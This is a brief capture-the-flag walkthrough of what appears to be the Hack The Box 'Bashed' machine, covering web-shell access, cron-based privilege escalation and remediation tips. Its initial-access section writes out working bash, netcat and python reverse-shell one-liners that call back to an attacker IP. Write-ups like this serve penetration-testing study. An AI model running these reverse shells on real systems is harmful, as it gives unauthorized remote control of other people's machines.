1. Recon

> 80 Apache/2.4.18

- has directories /php, /dev and /uploads
- the /dev has phpbash.sh script itself

2. Intial Access

- Accessed phpbash.sh and tried, bash, nc and python reverse shell, luckily python reverse shellw worked and we got shell as www-data user.

```
sudo nc -nvlp 443
# bash shell
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.11/443 0>&1"
# nc shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.11 443 > /tmp/f
# Python shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

3. Post Exploit

- Did Enumeration using linenum script
- Found a sudo privilege to switch to scriptmanager user

4. Privilege Escalation

- Found a python file test.py and a file owned by root test.txt
- The file is found being used by cron job
- Added python reverse shell to cron job and got root



5. Remediations and Best Practices

- Never keep sensitive files on server
- Have Least Privilege for users


> References
https://www.noobsec.net/hackthebox/htb-bashed/

https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/bashed-writeup-w-o-metasploit